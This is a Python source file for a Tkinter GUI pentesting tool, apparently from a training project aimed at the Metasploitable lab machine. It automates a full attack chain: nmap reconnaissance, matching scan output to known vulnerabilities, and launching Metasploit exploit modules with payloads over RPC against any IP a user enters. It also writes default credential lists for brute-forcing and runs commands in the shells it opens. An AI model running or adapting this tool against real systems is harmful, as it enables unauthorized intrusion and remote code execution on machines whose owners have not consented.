# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
# NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY

import time
import sys
import os
sys.path.append(os.getcwd() + "/lib/")
from lib.msfrpc4 import *
import nmap_dest
import re
import subprocess
import utils
import scanNetwork
from knownVulnerabilities import vulnerabilities
import tkinter as tk
from tkinter import messagebox, simpledialog, ttk


###################################### GUI Variables ######################################
initial_setup_done = False # For button disable
server_setup_done = False # For button disable
TEST_MODE = False # For test mode to be called
RHOSTS = [] # Holds our target IP addresses
client = None # Holds our metasploit client


###################################### OG Variables ######################################
CHECK_MODE = False # will check for exploits rather than running them when can
RUN_NMAP = False # set this to false when you want to test on metasploit machine and assume all exploits will run
NMAP_AGGRESSIVENESS = 2
# in order of increasing levels of fucking around (and also in increasing levels of finding out)
NMAP_POSSIBLE_ARGS = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
EXPLOIT_NUM = 4 # for testingsd
#TEST_MODE = True
EXPLOIT_NUM = min(EXPLOIT_NUM, len(vulnerabilities) - 1)
#RHOSTS = ["192.168.130.128"] # PUT YOUR HOST HERE or feed it in through command line argument
if len(sys.argv) > 1:
    RHOSTS = list(sys.argv[1])
startTime = time.time()



###################################### GUI Functions ######################################

def run_setup_script(): # The intial setup script that runs the initial_setup.sh file
    global initial_setup_done, setup_button
    if not initial_setup_done:
        subprocess.Popen(["./initial_setup.sh"], shell=True)
        initial_setup_done = True
        setup_button.config(state="disabled")
        
        # Create a top-level pop-up window
        popup = tk.Toplevel(root)
        popup.title("Initial Setup in Progress")
        message = tk.Label(popup, text="Initial setup started, please wait 3 minutes. \nThis window will close automatically once it's done! \n\nNote: you will need to input your password in terminal to properly run the sudo commands.\n\n Note: If it says you have the requirements already then feel free to close this window and move on.")
        message.pack()

        # Function to close the popup
        def close_popup():
            popup.destroy()
            
        # Schedule the popup to close after 180 seconds (3 minutes)
        popup.after(180000, close_popup)


def run_server_script(): # Sets up msfconsole RPC server
    global server_setup_done, server_button
    if not server_setup_done:
        subprocess.Popen(["./setup.sh"], shell=True)
        server_setup_done = True
        server_button.config(state="disabled")
       
       # Create a top-level pop-up window
        popup = tk.Toplevel(root)
        popup.title("Server Setup in Progress")
        message = tk.Label(popup, text="Server setup started, please wait 20 seconds. \nThis window will close automatically once it's done! \n\nNote: You only need to run this if you restarted your computer since the last time you ran this setup.")
        message.pack()

        # Function to close the popup
        def close_popup():
            popup.destroy()
            tk.messagebox.showinfo("Server Setup Script", "Server setup completed, Go have fun.")

        # Schedule the popup to close after 10 seconds
        popup.after(20000, close_popup)


def retrieve_input(): # Gets nmap aggressiveness from GUI
    # Get the input from the entry widget
    input_value = entry.get()
    try:
        # Convert to integer and validate range
        aggressiveness = int(input_value)
        if 0 <= aggressiveness <= 5:
            # Call your Nmap scan function here with aggressiveness
            print(f"Running Nmap scan with aggressiveness {aggressiveness}")
        else:
            print("Please enter a valid number between 0 and 5. Note that higher is faster but more detectable.")
    except ValueError:
        print("Please enter a valid integer.")


def initiate_nmap_scan(): # Runs the Nmap scan
    # Assuming aggressiveness is obtained from the GUI
    input_value = entry.get()
    if input_value.isdigit():  # Check if the input is a digit
        aggressiveness = int(input_value)
        if 0 <= aggressiveness <= 5:
            nmap_dest.run_scan(aggressiveness)
            print(f"Running Nmap scan with aggressiveness {aggressiveness}")
        else:
            tk.messagebox.showwarning("Warning", "Please enter a valid number between 0 and 5.")
    else:
        tk.messagebox.showwarning("Warning", "Please enter a valid integer for Nmap scan aggressiveness.")


def update_rhosts_combobox(new_items): # Updates the RHOSTS combobox with new items
    rhosts_combobox['values'] = new_items
    if new_items:
        rhosts_combobox.current(0)  # Optionally, set the first item as the default selection


def on_rhosts_select(event): # Updates the RHOSTS variable when a new item is selected
    global RHOSTS
    selected_value = rhosts_combobox.get()
    if selected_value and selected_value != "Select RHOST":
        RHOSTS = [selected_value]
        print(f"RHOSTS set to: {RHOSTS}")  # For debugging


def start_metasploit(): # Starts metasploit and kills all previous sessions
    global client # We need to make client global so we can use it in other functions 
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    for k in client.sessions.list.keys():
        client.sessions.session(str(k)).stop()
    print("Sessions list (should be empty):", client.sessions.list)
    for k in client.jobs.list.keys():
        client.jobs.stop(str(k))
    print("Jobs list (should be empty)", client.jobs.list)
    for console in client.consoles.list:
        k = console["id"]
        client.consoles.console(str(k)).destroy()
    print("Consoles (should be empty):", client.consoles.list)
    print()


def toggle_test_mode():
    global TEST_MODE
    if test_mode_var.get() == 1:
        TEST_MODE = True
        print("Test Mode is ON")
        # Additional actions when Test Mode is enabled
    else:
        TEST_MODE = False
        print("Test Mode is OFF")
        # Additional actions when Test Mode is disabled


def add_to_rhosts():
    global RHOSTS
    new_ip = new_ip_entry.get()
    if new_ip:  # Check if the new IP field is not empty
        RHOSTS.append(new_ip)
        update_rhosts_combobox(RHOSTS + ["Select RHOST"])  # Update dropdown values
        new_ip_entry.delete(0, tk.END)  # Clear the input field
        rhosts_combobox.current(len(RHOSTS) - 1)  # Select the newly added IP
        on_rhosts_select(None)  # Trigger the selection event manually

###################################### Functions from Main ######################################

# Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOIT_NUM]])):
    consoles = []
    savedOutputInfo = dict()

    global client
    if client is None: #If there is no client, then we can't run exploits
        print("Metasploit client is not initialized.")
        return

    # load the list of default passwords and usernames and overwrite the existing files so we can add more terms later
    usernames = utils.default_usernames
    passwords = utils.default_passwords
    userFile = open("USERNAMES.txt", "w")
    for username in usernames:
        userFile.write(username + "\n")
    userFile.close()
    usernames = []
    passFile = open("PASSWORDS.txt", "w")
    for password in passwords:
        passFile.write(password + "\n")
    passFile.close()
    passwords = []

    for (i, vulnerability) in enumerate(vulnerabilitiesToUse):
        # once one session is created, don't perform any of the other exploits
        if vulnerability.exploitType == "exploit" and len(client.sessions.list) > 0:
            print("Skipping vulnerability as RCE session has already been created")
            continue
        module = vulnerability.module
        exploit = client.modules.use(vulnerability.exploitType, module)
        # options = exploit.options
        exploit.missing_required
        if 'RHOSTS' in exploit.missing_required:
            exploit['RHOSTS'] = RHOSTS[0] # TODO: change this to loop through
        if exploit.missing_required:
            print("missing options:", exploit.missing_required)
        
        if vulnerability.options:
            print("Settings:")
            for option, value in vulnerability.options.items():
                print(option + ":", value)
                exploit[option] = value

        if CHECK_MODE & vulnerability.canCheck: # CHECK THE EXPLOIT's FEASIBILITY
            print("#" * 34, "ONLY CHECKING EXPLOITABILITY", "#" * 34)
            print("VULNERABILITY MODULE:", vulnerability.module)
            if vulnerability.payload:
                print("PAYLOAD:", vulnerability.payload)
                payload_ = client.modules.use('payload', vulnerability.payload)
                print("!!  CHECK STATUS  !!:", exploit.check_redo(payload=payload_))
                print("!! CHECK STATUS 2 !!:", exploit.check_redo(payload=vulnerability.payload))
            else:
                print("!! CHECK STATUS !!:", exploit.check_redo())
            exploit.check_redo()
        else: ### EXPLOIT THE MODULE
            print("#" * 34, "RUNNING", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)
            # print("EXPLOIT INFO:\n" + exploit._info) # uncomment this for A LOT of info
            print("VULNERABILITY MODULE:", vulnerability.module)
            console = client.consoles.console()
            consoles.append((console, vulnerability.description))
            if vulnerability.payload:
                print("PAYLOAD:", vulnerability.payload)
                print("PAYLOAD IS VALID:", vulnerability.payload in exploit.targetpayloads())
                payload_ = client.modules.use('payload', vulnerability.payload)
                if payload_.missing_required:
                    print("PAYLOAD MISSING OPTIONS:", payload_.missing_required)
                output = console.run_module_with_output(exploit, payload=payload_)
                # exploit.execute(payload=vulnerability.payload)
                # exploit.execute(payload=payload_)
                # output = ""
            else:
                output = console.run_module_with_output(exploit)
            print("XXXXXXXXX\n\n\n", output)
            # print("\nOUTPUT:\n" + output) # uncomment this for debugging output
            resultExtracted = utils.getSuccessMessage(output)
            print("OUTPUT extracted:")
            print(resultExtracted)
            if vulnerability.outputPatternMatch:
                savedOutputInfo[i] = []
                for line in resultExtracted.splitlines():
                    matchedText = re.search(vulnerability.outputPatternMatch, line)
                    if matchedText:
                        savedOutputInfo[i].append(matchedText[0])
            if vulnerability.addUserNames:
                for line in savedOutputInfo[i]:
                    idx = savedOutputInfo[i].find(":")
                    if idx >= 0:
                        names = savedOutputInfo[i][i+1:].strip().split(",")
                        usernames += names
                userFile = open("USERNAMES.txt", "w")
                for username in usernames:
                    userFile.write(username + "\n")
                userFile.close()
            print("#" * 34, "FINISHED", vulnerability.exploitType + ":", vulnerability.description, "#" * 34)

    print("ALL EXPLOITS SETUP AND RUNNING")
    while(client.jobs.list):
        print("SESSION LIST [" + str(len(client.sessions.list)) + "]:", client.sessions.list)
        print("JOB LIST [" + str(len(client.jobs.list)) + "]:", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
        time.sleep(10)
    print("SESSION LIST:", client.sessions.list)
    return savedOutputInfo


def utils_command(): # Runs a command in the utils.py file
    # utils.runThisCommand("sudo snap install metasploit-framework")
        print(utils.runThisCommand("whoami"))
        print(utils.runThisCommand("sudo systemctl enable snapd.service"))
        print(utils.runThisCommand("sudo systemctl start snapd.service"))
        time.sleep(5)

        print("SNAP INSTALLING METASPLOIT-FRAMEWORK") 
        p = subprocess.Popen(["sudo snap install metasploit-framework"], stdout=subprocess.PIPE, shell=True)
        (output, err) = p.communicate() 
        p_status = p.wait()
        print("DONE INSTALLING METASPLOIT-FRAMEWORK") 
        time.sleep(10)


def test_mode(): # Runs the test mode
    global TEST_MODE
    if TEST_MODE:
        # Create a popup window for test mode
        test_popup = tk.Toplevel(root)
        test_popup.title("Test Mode")

        # Label for dropdown
        test_label = tk.Label(test_popup, text="Select a Vulnerability to Test:")
        test_label.pack(pady=(10, 0))

        # Dropdown for vulnerabilities
        vulnerability_options = [vuln.description for vuln in vulnerabilities]  # Assuming vulnerabilities is a list of objects
        vulnerability_dropdown = ttk.Combobox(test_popup, values=vulnerability_options)
        vulnerability_dropdown.pack(pady=5)

        # Input for manual vulnerability number entry
        vulnerability_number_label = tk.Label(test_popup, text="Or enter a Vulnerability number:")
        vulnerability_number_label.pack(pady=(10, 0))

        vulnerability_number_entry = tk.Entry(test_popup)
        vulnerability_number_entry.pack(pady=5)

        # Function to run when Submit is clicked
        def on_submit():
            global client
            selected_vulnerability = vulnerability_dropdown.get()
            entered_number = vulnerability_number_entry.get()
            
            if client is None:
                start_metasploit()  # Initialize the Metasploit client if not already done
            
            if entered_number.isdigit():
                vulnerability_index = int(entered_number) - 1  # Adjust if your indexing starts from 1
                runExploits([vulnerabilities[vulnerability_index]])
            elif selected_vulnerability in vulnerability_options:
                vulnerability_index = vulnerability_options.index(selected_vulnerability)
                runExploits([vulnerabilities[vulnerability_index]])
            else:
                messagebox.showerror("Error", "Please select a valid vulnerability or enter a number.")
            
            test_popup.destroy()

        # Submit button for the popup
        submit_button = tk.Button(test_popup, text="Submit", command=on_submit)
        submit_button.pack(pady=(5, 10))

    else:
        messagebox.showinfo("Test Mode", "TEST_MODE is False, please set it to True to run exploits")


def full_exploitation_cycle():
        global NMAP_AGGRESSIVENESS, RHOSTS, RUN_NMAP, client
        
        nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
        for RHOST in RHOSTS:
            print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
            # Decides if we want to run nmap or just assumes all outputs work
            if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
                ######## RECONAISSANCE PHASE ########
                nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
                print(nmapOutput)
                if (nmapOutput[1][0:22] == "Note: Host seems down."):
                    print("Host seems down. Exiting.")
                    exit()

                ######## WEAPONIZATION PHASE ########
                vulnerabilitiesToUse = set()
                vulnInfos = []
                for i in range(len(vulnerabilities)):
                    vulnInfos.append(dict())
                    vulnInfos[i]["keywords"] = set()
                    vulnInfos[i]["optionalKeywords"] = set()
                # Scan nmap output for key terms
                for line in nmapOutput:
                    # Detect what keywords each line of the nmap output contains and compare those to the descriptions
                    # for each known vulnerability and add matched key terms to vulnInfosDict
                    for (i, vulnerability) in enumerate(vulnerabilities):
                        flag = re.IGNORECASE
                        if vulnerability.caseSensitiveKeyTermMatch:
                            flag = 0
                        for keyword in vulnerability.keywords:
                            if re.search(keyword, line, flag):
                                vulnInfos[i]["keywords"].add(keyword)
                        for optionalKeyword in vulnerability.optionalKeywords:
                            if re.search(optionalKeyword, line, flag):
                                vulnInfos[i]["optionalKeywords"].add(optionalKeyword)
                
                # Determine which vulns to use based off NMAP scan
                # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
                for (i, vulnInfo) in enumerate(vulnInfos):
                    if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
                        print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
                        vulnerabilitiesToUse.add(vulnerabilities[i])
            else:
                # here we don't run nmap and just assume that all vulnerabilities work
                print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
                vulnerabilitiesToUse = vulnerabilities
            
            ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
            savedOutputInfo = runExploits(vulnerabilitiesToUse)

            ####### Print some info on the sessions created
            print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
            sessions = client.sessions.list
            numSessions = 0
            for k in client.sessions.list.keys():
                numSessions += 1
            print("Number of sessions created:", numSessions)

            print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
            for k in client.sessions.list.keys():
                shell = client.sessions.session(str(k))
                shell.write('whoami')
                shell.write('pwd')
                print(shell.read())

            # print out saved info from running exploits
            print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
            for v in savedOutputInfo.keys():
                print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
                for line in savedOutputInfo[v]:
                    print(line)

###################################### The GUI ######################################

# Create the GUI
root = tk.Tk()
root.title("Bootcon Pentesting Tool GUI v0.2")

root.configure(bg='#001633')  # Set the background color of the window to black



########## The Widgets ##########

# Button to run initial setup script
setup_button = tk.Button(root, text="Run Initial Setup", command=run_setup_script, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
setup_button.pack(pady=5)

# Button to run server script
server_button = tk.Button(root, text="Run Server Setup", command=run_server_script, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
server_button.pack(pady=5)

# Checkbox for test mode
test_mode_var = tk.IntVar() # Create a variable to store the state of the test mode checkbox
test_mode_checkbox = tk.Checkbutton(root, text="Enable Test Mode", variable=test_mode_var, command=toggle_test_mode)
test_mode_checkbox.pack()

# Button for test mode
test_mode_button = tk.Button(root, text="Test Mode", command=test_mode, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
test_mode_button.pack(pady=5)

# Input for aggressiveness of Nmap scan
label = tk.Label(root, text="Enter the aggressiveness of the nmap scan (0-5):", bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
label.pack(pady=5)

entry = tk.Entry(root)
entry.pack()

button = tk.Button(root, text="Submit", command=retrieve_input, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
button.pack(pady=5)

# Button to start metasploit
metasploit_button = tk.Button(root, text="Start Metasploit", command=start_metasploit, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
metasploit_button.pack(pady=5)

# Start Nmap scan button
nmap_button = tk.Button(root, text="Submit Nmap Scan", command=initiate_nmap_scan, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
nmap_button.pack(pady=5)

# New IP Entry Field
new_ip_label = tk.Label(root, text="Enter new RHOST IP:", bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
new_ip_label.pack(pady=5)
new_ip_entry = tk.Entry(root)
new_ip_entry.pack()

# Button to Add New IP to RHOSTS
add_ip_button = tk.Button(root, text="Add IP to RHOSTS", command=add_to_rhosts, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
add_ip_button.pack(pady=5)

# RHost dropdown menu
rhosts_combobox = ttk.Combobox(root)
rhosts_combobox['values'] = ["Select RHOST"]  # Placeholder values
rhosts_combobox.current(0)  # Set the combobox to show the first item
rhosts_combobox.pack()

rhosts_combobox.bind("<<ComboboxSelected>>", on_rhosts_select)

# Button to run exploits function
exploits_button = tk.Button(root, text="Run runExploits", command=runExploits, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
exploits_button.pack(pady=5)

# Button to run utils function
utils_button = tk.Button(root, text="Run utils_command", command=utils_command, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
utils_button.pack(pady=5)

# Button to run big boi function
full_exploit_button = tk.Button(root, text="Run full_exploitation_cycle", command=full_exploitation_cycle, bg='#001633', fg='#ffab40', activebackground='gold', activeforeground='#001633', highlightthickness=2, highlightbackground='gold', highlightcolor='gold', bd=0)
full_exploit_button.pack(pady=5)

# Run the application (Remember everything that is used needs to be defined above this)
root.mainloop()












if __name__ == "__main__":
    pass
    #############################################################################
    # RUN ./setup.sh TO SET EVERYTHING UP.  This is for automating the exploit only
    # proc1 = subprocess.Popen(["yes | ./setup.sh"])
    # print("FINISHED SETTING UP SERVER")
    # time.sleep(180)
    # proc1.kill()

    ## utils.runThisCommand("sudo snap install metasploit-framework")
    #print(utils.runThisCommand("whoami"))
    #print(utils.runThisCommand("sudo systemctl enable snapd.service"))
    #print(utils.runThisCommand("sudo systemctl start snapd.service"))
    #time.sleep(5)
    #
    #print("SNAP INSTALLING METASPLOIT-FRAMEWORK") 
    #p = subprocess.Popen(["sudo snap install metasploit-framework"], stdout=subprocess.PIPE, shell=True)
    #(output, err) = p.communicate() 
    #p_status = p.wait()
    #print("DONE INSTALLING METASPLOIT-FRAMEWORK") 
    #time.sleep(10)

    # this needs to be run janky like this cuz the command sometimes just hangs 
    # and doesnt run to completion but its ok cuz it runs the shit we need it to run
    #proc1 = subprocess.Popen(["./setup.sh"])
    #time.sleep(180)
    #proc1.kill()
    #exit()

    # basically starts metasploit and kill all previous sessions 
    #client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    #for k in client.sessions.list.keys():
    #    client.sessions.session(str(k)).stop()
    #print("Sessions list (should be empty):", client.sessions.list)
    #for k in client.jobs.list.keys():
    #    client.jobs.stop(str(k))
    #print("Jobs list (should be empty)", client.jobs.list)
    #for console in client.consoles.list:
    #    k = console["id"]
    #    client.consoles.console(str(k)).destroy()
    #print("Consoles (should be empty):", client.consoles.list)
    #print()

    # output = self.client.consoles.console(console_id).run_module_with_output(exploit)                
    # dict_module['results'] = self.extractResult(output)
    # resultModules.append(dict_module)

    ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
    #if TEST_MODE:
    #    savedOutputInfo = runExploits()
    #    exit()
    ##############################################################################################

    #nmapArgs = NMAP_POSSIBLE_ARGS[NMAP_AGGRESSIVENESS]
    #for RHOST in RHOSTS:
    #    print("X" * 34, "BEGINNING OF OUTPUT FOR", RHOST,"X" * 34)
    #    # Decides if we want to run nmap or just assumes all outputs work
    #    if RUN_NMAP: # TODO: make option so instead of not running nmap, take file input as hypothetical output of NMAP
    #        ######## RECONAISSANCE PHASE ########
    #        nmapOutput = nmap_dest.nmap_xml_output(RHOST, nmapArgs)
    #        print(nmapOutput)
    #        if (nmapOutput[1][0:22] == "Note: Host seems down."):
    #            print("Host seems down. Exiting.")
    #            exit()
    #
    #        ######## WEAPONIZATION PHASE ########
    #        vulnerabilitiesToUse = set()
    #        vulnInfos = []
    #        for i in range(len(vulnerabilities)):
    #            vulnInfos.append(dict())
    #            vulnInfos[i]["keywords"] = set()
    #            vulnInfos[i]["optionalKeywords"] = set()
    #        # Scan nmap output for key terms
    #        for line in nmapOutput:
    #            # Detect what keywords each line of the nmap output contains and compare those to the descriptions
    #            # for each known vulnerability and add matched key terms to vulnInfosDict
    #            for (i, vulnerability) in enumerate(vulnerabilities):
    #                flag = re.IGNORECASE
    #                if vulnerability.caseSensitiveKeyTermMatch:
    #                    flag = 0
    #                for keyword in vulnerability.keywords:
    #                    if re.search(keyword, line, flag):
    #                        vulnInfos[i]["keywords"].add(keyword)
    #                for optionalKeyword in vulnerability.optionalKeywords:
    #                    if re.search(optionalKeyword, line, flag):
    #                        vulnInfos[i]["optionalKeywords"].add(optionalKeyword)
    #        
    #        # Determine which vulns to use based off NMAP scan
    #        # If we match a keyterm or find minOptionalKeyTermsThatMustMatch optional key terms
    #        for (i, vulnInfo) in enumerate(vulnInfos):
    #            if len(vulnInfo["keywords"]) > 0 or len(vulnInfo["optionalKeywords"]) > vulnerabilities[i].minOptionalKeyTermsThatMustMatch:
    #                print("X" * 34, vulnerabilities[i].description, "EXPLOIT FOUND", "*" * 34)
    #                vulnerabilitiesToUse.add(vulnerabilities[i])
    #    else:
    #        # here we don't run nmap and just assume that all vulnerabilities work
    #        print("SKIPPING NMAP PHASE, RUNNING ALL EXPLOITS WORK")
    #        vulnerabilitiesToUse = vulnerabilities
    #    
    #    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
    #    savedOutputInfo = runExploits(vulnerabilitiesToUse)
    #
    #    ####### Print some info on the sessions created
    #    print("@" * 34, "ALL EXPLOITS FINISHED", "@" * 34)
    #    sessions = client.sessions.list
    #    numSessions = 0
    #    for k in client.sessions.list.keys():
    #        numSessions += 1
    #    print("Number of sessions created:", numSessions)
    #
    #    print("Testing sessions (two lines should appear below, the result of the 'whoami' and 'pwd' commands):")
    #    for k in client.sessions.list.keys():
    #        shell = client.sessions.session(str(k))
    #        shell.write('whoami')
    #        shell.write('pwd')
    #        print(shell.read())
    #
    #    # print out saved info from running exploits
    #    print("$" * 34, "SAVED OUTPUT INFO", "$" * 34)
    #    for v in savedOutputInfo.keys():
    #        print("SAVED OUTPUT FOR EXPLOIT", v, "(" + vulnerabilities[v].description + "):")
    #        for line in savedOutputInfo[v]:
    #            print(line)
    #   